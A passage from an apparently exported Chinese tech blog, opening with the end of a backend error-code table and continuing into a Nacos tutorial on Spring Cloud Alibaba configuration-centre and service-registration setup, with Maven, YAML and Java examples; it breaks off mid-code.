<td>中间件服务出错</td>
<td>二级宏观错误码</td>
</tr>
<tr>
<td>C0110</td>
<td>RPC 服务出错</td>
<td></td>
</tr>
<tr>
<td>C0111</td>
<td>RPC 服务未找到</td>
<td></td>
</tr>
<tr>
<td>C0112</td>
<td>RPC 服务未注册</td>
<td></td>
</tr>
<tr>
<td>C0113</td>
<td>接口不存在</td>
<td></td>
</tr>
<tr>
<td>C0120</td>
<td>消息服务出错</td>
<td></td>
</tr>
<tr>
<td>C0121</td>
<td>消息投递出错</td>
<td></td>
</tr>
<tr>
<td>C0122</td>
<td>消息消费出错</td>
<td></td>
</tr>
<tr>
<td>C0123</td>
<td>消息订阅出错</td>
<td></td>
</tr>
<tr>
<td>C0124</td>
<td>消息分组未查到</td>
<td></td>
</tr>
<tr>
<td>C0130</td>
<td>缓存服务出错</td>
<td></td>
</tr>
<tr>
<td>C0131</td>
<td>key 长度超过限制</td>
<td></td>
</tr>
<tr>
<td>C0132</td>
<td>value 长度超过限制</td>
<td></td>
</tr>
<tr>
<td>C0133</td>
<td>存储容量已满</td>
<td></td>
</tr>
<tr>
<td>C0134</td>
<td>不支持的数据格式</td>
<td></td>
</tr>
<tr>
<td>C0140</td>
<td>配置服务出错</td>
<td></td>
</tr>
<tr>
<td>C0150</td>
<td>网络资源服务出错</td>
<td></td>
</tr>
<tr>
<td>C0151</td>
<td>VPN 服务出错</td>
<td></td>
</tr>
<tr>
<td>C0152</td>
<td>CDN 服务出错</td>
<td></td>
</tr>
<tr>
<td>C0153</td>
<td>域名解析服务出错</td>
<td></td>
</tr>
<tr>
<td>C0154</td>
<td>网关服务出错</td>
<td></td>
</tr>
<tr>
<td>C0200</td>
<td>第三方系统执行超时</td>
<td>二级宏观错误码</td>
</tr>
<tr>
<td>C0210</td>
<td>RPC 执行超时</td>
<td></td>
</tr>
<tr>
<td>C0220</td>
<td>消息投递超时</td>
<td></td>
</tr>
<tr>
<td>C0230</td>
<td>缓存服务超时</td>
<td></td>
</tr>
<tr>
<td>C0240</td>
<td>配置服务超时</td>
<td></td>
</tr>
<tr>
<td>C0250</td>
<td>数据库服务超时</td>
<td></td>
</tr>
<tr>
<td>C0300</td>
<td>数据库服务出错</td>
<td>二级宏观错误码</td>
</tr>
<tr>
<td>C0311</td>
<td>表不存在</td>
<td></td>
</tr>
<tr>
<td>C0312</td>
<td>列不存在</td>
<td></td>
</tr>
<tr>
<td>C0321</td>
<td>多表关联中存在多个相同名称的列</td>
<td></td>
</tr>
<tr>
<td>C0331</td>
<td>数据库死锁</td>
<td></td>
</tr>
<tr>
<td>C0341</td>
<td>主键冲突</td>
<td></td>
</tr>
<tr>
<td>C0400</td>
<td>第三方容灾系统被触发</td>
<td>二级宏观错误码</td>
</tr>
<tr>
<td>C0401</td>
<td>第三方系统限流</td>
<td></td>
</tr>
<tr>
<td>C0402</td>
<td>第三方功能降级</td>
<td></td>
</tr>
<tr>
<td>C0500</td>
<td>通知服务出错</td>
<td>二级宏观错误码</td>
</tr>
<tr>
<td>C0501</td>
<td>短信提醒服务失败</td>
<td></td>
</tr>
<tr>
<td>C0502</td>
<td>语音提醒服务失败</td>
<td></td>
</tr>
<tr>
<td>C0503</td>
<td>邮件提醒服务失败</td>
<td></td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>编程规范</tag>
      </tags>
  </entry>
  <entry>
    <title>Nacos 使用示例</title>
    <url>/20230301/d8cb1733.html</url>
    <content><![CDATA[<h1>配置中心示例</h1>
<p>源码地址：<a href="https://github.com/hmxyl/nacosdemo.git">https://github.com/hmxyl/nacosdemo.git</a></p>
<h2 id="准备Nacos配置文件">准备Nacos配置文件</h2>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230510164730428.png" alt="image-20230510164730428"></p>
<h2 id="使用-application-yml-配置（推荐）">使用 application.yml 配置（推荐）</h2>
<blockquote>
<ol>
<li>版本号<br>
从 2021.0.1.0 开始，Spring Cloud Alibaba  版本将会对应 Spring Cloud 版本，<br>
前三位为 Spring Cloud 版本，最后一位为扩展版本</li>
<li>弃用 <code>bootstrap.yml</code> 文件（Spring Cloud 在Spring boot 2.4以后无法应用BootStrap.yml）</li>
<li>源码： configuration 模块</li>
</ol>
</blockquote>
<ol>
<li>
<p>pom.xml</p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-cloud-starter-alibaba-nacos-config<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>application.yml</p>
 <pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">server</span><span class="token punctuation">:</span>
  <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">8801</span>
<span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">application</span><span class="token punctuation">:</span>
    <span class="token key atrule">name</span><span class="token punctuation">:</span> configuration
  <span class="token key atrule">cloud</span><span class="token punctuation">:</span>
    <span class="token key atrule">nacos</span><span class="token punctuation">:</span>
      <span class="token key atrule">server-addr</span><span class="token punctuation">:</span> native.virtual.com<span class="token punctuation">:</span><span class="token number">8848</span>
      <span class="token key atrule">config</span><span class="token punctuation">:</span>
        <span class="token key atrule">server-addr</span><span class="token punctuation">:</span> $<span class="token punctuation">{</span>spring.cloud.nacos.server<span class="token punctuation">-</span>addr<span class="token punctuation">}</span>
        <span class="token key atrule">namespace</span><span class="token punctuation">:</span> learn<span class="token punctuation">-</span>$<span class="token punctuation">{</span>spring.profiles.active<span class="token punctuation">}</span>
  <span class="token key atrule">config</span><span class="token punctuation">:</span>
    <span class="token key atrule">import</span><span class="token punctuation">:</span>
      <span class="token punctuation">-</span> optional<span class="token punctuation">:</span>nacos<span class="token punctuation">:</span>$<span class="token punctuation">{</span>spring.application.name<span class="token punctuation">}</span>.yml<span class="token punctuation">?</span>refreshEnabled=true<span class="token important">&amp;group=DEFAULT_GROUP</span>
      <span class="token punctuation">-</span> optional<span class="token punctuation">:</span>nacos<span class="token punctuation">:</span>text.yml<span class="token punctuation">?</span>refreshEnabled=true<span class="token important">&amp;group=DEFAULT_GROUP</span>
      <span class="token punctuation">-</span> optional<span class="token punctuation">:</span>nacos<span class="token punctuation">:</span>code.yml<span class="token punctuation">?</span>refreshEnabled=true<span class="token important">&amp;group=DEFAULT_GROUP</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>启动时 配置 active profiles 为 <code>dev</code></p>
</li>
<li>
<p>启动 ConfigurationOldApplication</p>
</li>
<li>
<p>访问 <a href="http://localhost:8801/config/info">http://localhost:8801/config/info</a> 获取配置信息</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RestController</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConfigClientController</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Autowired</span>
    <span class="token class-name">ConfigInfo</span> configInfo<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/config/info"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getConfigInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> configInfo<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> configInfo<span class="token punctuation">.</span><span class="token function">getCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>Junit 单元测试</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>local<span class="token punctuation">.</span>bean<span class="token punctuation">.</span></span><span class="token class-name">ConfigInfo</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>jupiter<span class="token punctuation">.</span>api<span class="token punctuation">.</span></span><span class="token class-name">Test</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>runner<span class="token punctuation">.</span></span><span class="token class-name">RunWith</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>test<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">SpringBootTest</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">ActiveProfiles</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">TestPropertySource</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>context<span class="token punctuation">.</span>junit4<span class="token punctuation">.</span></span><span class="token class-name">SpringRunner</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Resource</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@RunWith</span><span class="token punctuation">(</span><span class="token class-name">SpringRunner</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@SpringBootTest</span><span class="token punctuation">(</span>classes <span class="token operator">=</span> <span class="token class-name">ConfigurationOldApplication</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@ActiveProfiles</span><span class="token punctuation">(</span><span class="token string">"dev"</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@TestPropertySource</span><span class="token punctuation">(</span>
        properties <span class="token operator">=</span> <span class="token punctuation">{</span>
                <span class="token string">"spring.cloud.nacos.config.namespace=learn-dev"</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">)</span>
<span class="token keyword">class</span> <span class="token class-name">ConfigurationOldApplicationTests</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Resource</span>
    <span class="token keyword">private</span> <span class="token class-name">ConfigInfo</span> configInfo<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">void</span> <span class="token function">testConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">assert</span> <span class="token string">"abc"</span><span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>configInfo<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">assert</span> <span class="token string">"123"</span><span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>configInfo<span class="token punctuation">.</span><span class="token function">getCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">assert</span> <span class="token string">"configuration_test"</span><span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>configInfo<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<p>参考[1]：<a href="https://github.com/alibaba/spring-cloud-alibaba/blob/2021.x/spring-cloud-alibaba-docs/src/main/asciidoc-zh/sca-upgrade-guide.adoc">https://github.com/alibaba/spring-cloud-alibaba/blob/2021.x/spring-cloud-alibaba-docs/src/main/asciidoc-zh/sca-upgrade-guide.adoc</a></p>
<p>参考[2]：<a href="https://developer.aliyun.com/article/897341#slide-12">https://developer.aliyun.com/article/897341#slide-12</a></p>
<h2 id="使用-bootstrap-yml-配置（不推荐）">使用 bootstrap.yml 配置（不推荐）</h2>
<blockquote>
<p>源码： configuration_old 模块</p>
</blockquote>
<ol>
<li>
<p>pom.xml</p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-cloud-starter-alibaba-nacos-config<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!--SpringCloud2020及以后的版本默认不启用 bootstrap 配置，我们需要在pom里面显式地引入：--&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-cloud-starter-bootstrap<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>注意：我们使用的 Spring Cloud 2020 版本默认不启用 bootstrap，若想要在应用启动时加载 bootstrap 配置（例如 bootstrap.yml 或 bootstrap.properties），就需要我们在 pom.xml 中显式的引入 spring-cloud-starter-bootstrap 依赖。</p>
</blockquote>
</li>
<li>
<p>bootstrap.yml</p>
 <pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">server</span><span class="token punctuation">:</span>
  <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">8802</span>
<span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">application</span><span class="token punctuation">:</span>
    <span class="token key atrule">name</span><span class="token punctuation">:</span> configuration_old
  <span class="token key atrule">cloud</span><span class="token punctuation">:</span>
    <span class="token key atrule">nacos</span><span class="token punctuation">:</span>
      <span class="token key atrule">config</span><span class="token punctuation">:</span>
        <span class="token key atrule">server-addr</span><span class="token punctuation">:</span> native.virtual.com<span class="token punctuation">:</span><span class="token number">8848</span>
        <span class="token key atrule">namespace</span><span class="token punctuation">:</span> learn<span class="token punctuation">-</span>$<span class="token punctuation">{</span>spring.profiles.active<span class="token punctuation">}</span>
        <span class="token key atrule">group</span><span class="token punctuation">:</span> DEFAULT_GROUP
        <span class="token key atrule">name</span><span class="token punctuation">:</span> configuration.yml
        <span class="token key atrule">file-extension</span><span class="token punctuation">:</span> yml
        extension<span class="token punctuation">-</span>configs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
          <span class="token key atrule">data-id</span><span class="token punctuation">:</span> text.yml
          <span class="token key atrule">refresh</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
        extension<span class="token punctuation">-</span>configs<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
          <span class="token key atrule">data-id</span><span class="token punctuation">:</span> code.yml
          <span class="token key atrule">refresh</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>config配置的dataID组成: ${prefix}-${spring.profiles.active}.${file-extension}</p>
<ul>
<li>${prefix}：默认取值为微服务的服务名，即配置文件中 <a href="http://spring.application.name">spring.application.name</a> 的值，我们可以在配置文件中通过配置 <code>spring.cloud.nacos.config.prefix</code> 来指定。</li>
<li>${spring.profiles.active}：表示当前环境对应的 Profile，例如 dev、test、prod 等。当没有指定环境的 Profile 时，其对应的连接符也将不存在， dataId 的格式变成${prefix}.${file-extension}。</li>
<li>${file-extension}：表示配置内容的数据格式，我们可以在配置文件中通过配置项 <code>spring.cloud.nacos.config.file-extension</code> 来配置，例如 properties 和 yaml。</li>
</ul>
</blockquote>
<p>问题记录：</p>
<ul>
<li>
<p><strong>若文件名称不为 bootstrap.yml， 则在启动时，会先加载默认配置。server-addr 为127.0.0.1:8848，而正确的配置，在注解参数读取完成之后，才能读取到。因此BEAN 创建失败</strong></p>
<p><code>com.alibaba.cloud.nacos.NacosConfigManager</code>、<code>com.alibaba.cloud.nacos.NacosConfigProperties</code></p>
</li>
</ul>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span></span>BeanCreationException</span><span class="token operator">:</span> <span class="token class-name">Error</span> creating bean <span class="token keyword">with</span> <span class="token namespace">name</span> 'scopedTarget<span class="token punctuation">.</span>configInfo'<span class="token operator">:</span> <span class="token class-name">Injection</span> of autowired dependencies failed<span class="token punctuation">;</span> nested exception is <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>IllegalArgumentException</span><span class="token operator">:</span> <span class="token class-name">Could</span> not resolve placeholder 'config<span class="token punctuation">.</span>text' in value <span class="token string">"${config.text}"</span>
	at <span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span>AutowiredAnnotationBeanPostProcessor</span><span class="token punctuation">.</span><span class="token function">postProcessProperties</span><span class="token punctuation">(</span><span class="token class-name">AutowiredAnnotationBeanPostProcessor</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">405</span><span class="token punctuation">)</span> <span class="token operator">~</span><span class="token punctuation">[</span>spring<span class="token operator">-</span>beans<span class="token operator">-</span><span class="token number">5.3</span><span class="token number">.18</span><span class="token punctuation">.</span>jar<span class="token operator">:</span><span class="token number">5.3</span><span class="token number">.18</span><span class="token punctuation">]</span>
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>启动时 配置 active profiles 为 <code>dev</code></p>
</li>
<li>
<p>启动 ConfigurationOldApplication</p>
</li>
<li>
<p>访问 <a href="http://localhost:8802/config/info">http://localhost:8802/config/info</a> 获取配置信息。同上。</p>
</li>
<li>
<p>Junit测试。同上。</p>
</li>
</ol>
<h1>注册中心示例</h1>
<p>目的：将不同的服务，注册到<code>服务列表</code>中，如下图所示</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230510183445711.png" alt="image-20230510183445711"></p>
<table>
<thead>
<tr>
<th>字段</th>
<th>说明</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>服务名</td>
<td>注册的服务名称<code>spring.cloud.nacos.discovery.service</code> 默认配置的是：<code>spring.application.name</code></td>
<td></td>
</tr>
<tr>
<td>触发保护阈值</td>
<td>保护阈值：可以设置为0-1之间的浮点数，它其实是⼀个⽐例值（当前服务健康实例数/当前服务总实例数）<br><br>⼀般流程下， nacos是服务注册中⼼，服务消费者要从nacos获取某⼀个服务的可⽤实例信息，对于服务实例有健康/不健康状态之分， nacos在返回给消费者实例信息的时候，会返回健康实例。这个时候在⼀些⾼并发、⼤流量场景下会存在⼀定的问题：<br><br>如果服务A有100个实例， 98个实例都不健康了，只有2个实例是健康的，如果nacos只返回这两个健康实例的信息的话，那么后续消费者的请求将全部被分配到这两个实例，流量洪峰到来， 2个健康的实例也扛不住了，整个服务A 就扛不住，上游的微服务也会导致崩溃，产⽣雪崩效应。<br><br><strong>保护阈值的意义在于</strong>：当服务A健康实例数/总实例数 &lt; 保护阈值 的时候，说明健康实例真的不多了，这个时候保护阈值会被触发（状态<strong>true</strong>）<br>nacos将会把该服务所有的实例信息（健康的+不健康的）全部提供给消费者，消费者可能访问到不健康的实例，请求失败，但这样也⽐造成雪崩要好，牺牲了⼀些请求，保证了整个系统的⼀个可⽤</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<ul>
<li>服务注册中心（Register Service）：它是一个 Nacos Server，可以为服务提供者和服务消费者提供服务注册和发现功能。</li>
<li>服务提供者（Provider Service）：它是一个 Nacos Client，用于对外服务。它将自己提供的服务注册到服务注册中心，以供服务消费者发现和调用。</li>
<li>服务消费者（Consumer Service）：它是一个 Nacos Client，用于消费服务。它可以从服务注册中心获取服务列表，调用所需的服务。</li>
</ul>
<h2 id="注册服务提供者">注册服务提供者</h2>
<blockquote>
<p>producer_a、producer_a 两个模块，模拟两个服务提供者实例</p>
</blockquote>
<h3 id="producer-a">producer_a</h3>
<ol>
<li>
<p>pom.xml</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;dependencies&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
    &lt;/dependency&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;
        &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt;
    &lt;/dependency&gt;
&lt;/dependencies&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>application.yml</p>
 <pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">server</span><span class="token punctuation">:</span>
  <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">8001</span>
<span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token key atrule">application</span><span class="token punctuation">:</span>
    <span class="token key atrule">name</span><span class="token punctuation">:</span> producer
  <span class="token key atrule">cloud</span><span class="token punctuation">:</span>
    <span class="token key atrule">nacos</span><span class="token punctuation">:</span>
      <span class="token key atrule">server-addr</span><span class="token punctuation">:</span> native.virtual.com<span class="token punctuation">:</span><span class="token number">8848</span>
      <span class="token key atrule">discovery</span><span class="token punctuation">:</span>
        <span class="token key atrule">server-addr</span><span class="token punctuation">:</span> $<span class="token punctuation">{</span>spring.cloud.nacos.server<span class="token punctuation">-</span>addr<span class="token punctuation">}</span>
        <span class="token key atrule">namespace</span><span class="token punctuation">:</span> learn<span class="token punctuation">-</span>$<span class="token punctuation">{</span>spring.profiles.active<span class="token punctuation">}</span>
        <span class="token key atrule">service</span><span class="token punctuation">:</span> $<span class="token punctuation">{</span>spring.application.name<span class="token punctuation">}</span>
        <span class="token key atrule">register-enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<table>
<thead>
<tr>
<th>配置</th>
<th>默认</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>spring.cloud.nacos.discovery.service</td>
<td>${<a href="http://spring.application.name">spring.application.name</a>}</td>
<td>注册服务名称</td>
</tr>
<tr>
<td>spring.cloud.nacos.discovery.register-enabled</td>
<td>true</td>
<td>是否注册服务</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</li>
<li>
<p>启动类上，使用 <code>@EnableDiscoveryClient</code> 注解开启 Nacos 服务发现功能</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@EnableDiscoveryClient</span>
<span class="token annotation punctuation">@SpringBootApplication</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProducerA</span> <span class="token punctuation">{</span>
	<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token class-name">SpringApplication</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">ProducerA</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>提供服务的业务方法（测试类）</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RestController</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DeptController</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"${server.port}"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> serverPort<span class="token punctuation">;</span>
    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"${spring.application.name}"</span><span class="token punctuation">)</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> serverName<span class="token punctuation">;</span>
    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/nacos/{id}"</span><span class="token punctuation">)</span>
